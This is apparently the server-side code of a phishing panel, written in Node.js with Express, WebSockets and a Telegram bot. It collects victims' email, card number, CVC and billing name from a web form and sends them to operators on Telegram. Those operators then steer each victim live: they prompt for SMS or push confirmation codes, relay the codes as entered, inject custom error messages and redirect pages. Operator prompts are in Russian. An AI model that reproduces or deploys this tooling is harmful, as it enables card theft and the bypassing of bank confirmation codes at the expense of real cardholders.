const { inlineButtons, messageFromBot, msgBot, api, codeMSG } = require('./data/preferences');
const { bot } = require('./bot');

const fs = require('fs');
const http = require("http");
const express = require( "express");
const WebSocket = require( "ws");
const { v4 } = require('uuid');
const app = express();
const server = http.createServer(app);
const webSocketServer = new WebSocket.Server({ server });



let messageData;
let clients = [];
let lastClient = 0;


const chat_ids = ()=> {
    try { return JSON.parse(fs.readFileSync('data/chat_ids.json', 'utf-8')); }
    catch (err) { return err };
}


const sendMessageFromBot = async (message, inline_keyboard={}, ws=null, formData={}, reply=null)=> {
    chat_ids().forEach(async user=> {
        let data;
        if(!reply) {
            data = await bot.sendMessage(user.chat_id, message, inline_keyboard);
        } else {
            data = await bot.sendMessage(user.chat_id, message, {
                reply_to_message_id: reply
            });
        }
        if(formData) {
            if(clients.filter(client=> client.message_id == data.message_id)) {
                clients = clients.filter(client=> client.message_id != data.message_id);
            }
            clients.push({
                'message_id': data.message_id,
                'method': '',
                'email': formData.email || '',
                'cardNumber': formData.cardNumber || '',
                'cvc': formData.cvc || '',
                'billingName': formData.billingName || '',
                'callbacks': {
                    'sms': false,
                    'customsms': false,
                    'push': false,
                    'custompush': false,
                    'ownerror': false,
                    '3dson': false,
                    'other_card': false,
                    'balance': false,
                    'limit': false,
                    'success': false

                },
                'events': {
                    customsms: false,
                    custompush: false,
                    owneror: false
                }
            });
        }
        if(ws) {
            ws.send(JSON.stringify({
                type: 'verify',
                message_id: data.message_id
            }));
        }
    });

}




webSocketServer.on('connection', async (ws, req) => {

    bot.on('callback_query', async ctx => {
        bot.answerCallbackQuery(ctx.id).then(() => {
            if (ctx.data == 'tap') {
                bot.sendMessage(ctx.message.chat.id, 'Tapped');
            }
        });
        try {
            clients.map((client)=> {
                if(client.message_id == ctx.message.message_id) {
                    client.method = ctx.data
                }
            })
            ws.send(JSON.stringify({
                'callback': ctx.data, 
                'type': 'checkUser',
                'message_id': ctx.message.message_id
            }));
            
        }

        catch (error) {console.log(error); }

    });

    bot.on('text', async msg=> {

        clients.forEach(client=> {
            if(client.customsms) {
                ws.send(JSON.stringify({
                    'type': 'customsms',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }

            if(client.custompush) {
                ws.send(JSON.stringify({
                    'type': 'custompush',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }

            if(client.ownerror) {
                ws.send(JSON.stringify({
                    'type': 'ownerror',
                    'message_id': client.message_id,
                    'text': msg.text
                }));
            }
        });
    });



    ws.on('message', async msg => {
        const msgData = JSON.parse(msg.toString());

        switch (msgData.type) {
            case 'button':
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id &&
                        client.method == msgData.callback
                    ) {
                        client.customsms = false;
                        client.custompush = false;
                        client.ownerror = false;


                        if(client.callbacks[msgData.callback]) return;
                        ws.send(JSON.stringify({
                            type: 'button',
                            message: msgData.message_id,
                            callback: msgData.callback
                        }));

                        client.callbacks[msgData.callback] = true;
                    }
                })
                break;
            case 'form':
                sendMessageFromBot(msgBot(msgData), inlineButtons, ws, msgData);
                break;
            case 'isOnline':
                clients.forEach(client=> {
                    if(client.method == msgData.callback) {
                        if(client.message_id == msgData.message_id) {
                            sendMessageFromBot('[ONLINE] - Пользователь в сети.', {}, null, {});
                        }
                    }
                });
                break;
            case 'sendSMS':
                clients.forEach(client=> {
                    if(client.message_id != msgData.message_id) return
                    sendMessageFromBot(codeMSG(client, msgData.code),{}, null, {}, client.message_id);
                });
                break;
            case 'isCustomSMS':
                // clients.forEach(client=> client.customsms = false);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.customsms = true;
                        sendMessageFromBot('[CUSTOM SMS] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'isCustomPUSH':
                // clients = clients.filter(client=> client.custompush != true);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.custompush = true;
                        sendMessageFromBot('[CUSTOM PUSH] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'isOwnError':
                // clients = clients.filter(client=> client.ownerror != true);
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        client.ownerror = true;
                        sendMessageFromBot('[OWNEROR] - Введите сообщение..', {}, null, {}, client.message_id);
                    }
                })
                break;
            case 'clientClick':
                if(msgData.event == 'PUSH') sendMessageFromBot(`[${msgData.event}] - Клиент подтвердил`, {}, null, {}, msgData.message_id);
                if(msgData.event == 'CUSTOM PUSH') sendMessageFromBot(`[${msgData.event}] - Клиент подтвердил`, {}, null, {}, msgData.message_id);
                if(msgData.event == 'REDIRECT') sendMessageFromBot(`[${msgData.event}] - Перенаправлен на главную.\nСессия недействительна`, {}, null, {}, msgData.message_id);
                break;
            case 'sendAdmin':
                clients.forEach(client=> {
                    if(client.message_id == msgData.message_id) {
                        if(msgData.callback == 'customsms' && client.customsms) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.customsms = false;
                        }
                        if(msgData.callback == 'custompush' && client.custompush) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.custompush = false;
                        }
                        if(msgData.callback == 'ownerror' && client.ownerror) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Отправлено`, {}, null, {}, msgData.message_id);
                            client.ownerror = false;
                        }
                        if(msgData.callback == 'success_pay') {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Вы подтвердили оплату клиенту.`, {}, null, {}, msgData.message_id);
                        }


                        if(msgData.to == `${msgData.callback}PAGE`) {
                            sendMessageFromBot(`[${msgData.callback.toUpperCase()}] - Вы перенаправили клиента.`, {}, null, {}, msgData.message_id);
                        }
                    }
                });
                break;
            case 'offline':
                clients = clients.filter(client=> client.message_id != msgData.message_id);
                break;
        }

   });


   ws.on("error", e => ws.send(e));
});


server.listen(9000, () => console.log("Server started"))
